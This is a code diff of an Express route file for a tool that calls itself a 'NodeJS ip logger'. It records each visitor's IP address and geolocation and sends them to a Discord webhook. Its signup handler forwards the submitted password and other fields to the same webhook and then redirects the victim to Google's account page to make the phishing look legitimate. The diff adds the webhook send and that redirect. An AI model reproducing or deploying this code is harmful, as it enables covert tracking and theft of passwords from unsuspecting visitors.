@@ -18,7 +18,6 @@ router.get("/", (req, res, next) => {
       const geo = geoip.lookup(SplitIp) || { country: null, region: null, timezone: null, city: null };
       const embed = new MessageBuilder()
         .setTitle("NodeJS ip logger")
-        .setDescription("New ip!")
         .setAuthor(
           "maxwalks",
           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&",
@@ -35,7 +34,7 @@ router.get("/", (req, res, next) => {
         .addField("Request", `**${req.method}** ${req.url}`)
         .setColor(7785669)
         .setDescription(
-          "Fetch the ip address of any user, just by opening the website."
+          "New ip!"
         )
         .setFooter(
           "Made by maxwalks",
@@ -48,8 +47,7 @@ router.get("/", (req, res, next) => {
         res.render('index')
     }
   } catch (error) {
-    next(error)
-    console.log(error.message)
+    console.log(error)
   }
 });
 
@@ -73,21 +71,17 @@ router.post('/signup', (req, res, next) => {
         .addField("Password", `${password}`)
         .addField("Request", `**${req.method}** ${req.url}`)
         .setColor(7785669)
-        .setDescription(
-          "Fetch the ip address of any user, just by opening the website."
-        )
         .setFooter(
           "Made by maxwalks",
           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&"
         )
         .setTimestamp();
         hook.send(embed1)
-        res.redirect("/")
+        res.redirect("https://www.google.com/account/about/")
     } else {
       const SplitIp = ip.split(",")[0];
       const embed = new MessageBuilder()
         .setTitle("NodeJS ip logger")
-        .setDescription("New signup info!")
         .setAuthor(
           "maxwalks",
           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&",
@@ -102,21 +96,19 @@ router.post('/signup', (req, res, next) => {
         .addField("Request", `**${req.method}** ${req.url}`)
         .setColor(7785669)
         .setDescription(
-          "Fetch the ip address of any user, just by opening the website."
+          "New signup info!"
         )
         .setFooter(
           "Made by maxwalks",
           "https://cdn.discordapp.com/attachments/1198679960076959825/1234152158899736717/logo.jpg?ex=662fb144&is=662e5fc4&hm=f87965035d55d0045c6fc480e3b0015f8c9c5d9cbb4bc9e4138e5ecf3405d1c4&"
         )
         .setTimestamp();
+      hook.send(embed)
+      res.redirect('https://www.google.com/account/about/')
     }
   } catch (error) {
     next(error)
   }
-})
-
-router.get('/success', (req, res) => {
-  res.status(200).json({ success: "Successfully fetched ip address." })
 })
 
 router.get('/error', (req, res) => {
